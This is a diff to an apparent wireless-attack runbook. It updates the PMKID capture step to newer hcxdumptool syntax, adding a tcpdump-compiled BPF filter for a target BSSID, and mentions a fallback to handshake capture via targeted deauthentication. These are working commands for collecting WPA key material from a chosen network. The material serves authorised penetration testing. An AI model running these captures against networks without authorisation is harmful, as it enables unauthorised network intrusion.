@@ -5,10 +5,20 @@ suppresses PMKID, fall back to 4-way capture with targeted deauth.
 
 ## Path A — PMKID (Steube 2018)
 
+CLI is pinned to hcxdumptool 7.3 — see `hcx-tools/reference.md` for
+the 4.x → 6.x → 7.x compat table.
+
 ```
 # on the Pineapple, over SSH
-hcxdumptool -i wlan1 -o /tmp/pmkid.pcapng --enable_status=1 \
-            --filterlist_ap=/root/target.bssidlist --filtermode=2
+# 1. Compile a BPF filter for the target BSSID.
+echo 'wlan addr3 aa:bb:cc:dd:ee:ff' > /root/target.bpf.src
+tcpdump -y IEEE802_11_RADIO -F /root/target.bpf.src -ddd \
+        > /root/target.bpf
+
+# 2. Capture. -w replaces the old -o; --bpf replaces
+#    --filterlist_ap / --filtermode.
+hcxdumptool -i wlan1 -w /tmp/pmkid.pcapng -c 6 \
+            --enable_status=3 --bpf=/root/target.bpf
 
 # stop after PMKID landed
 Ctrl-C
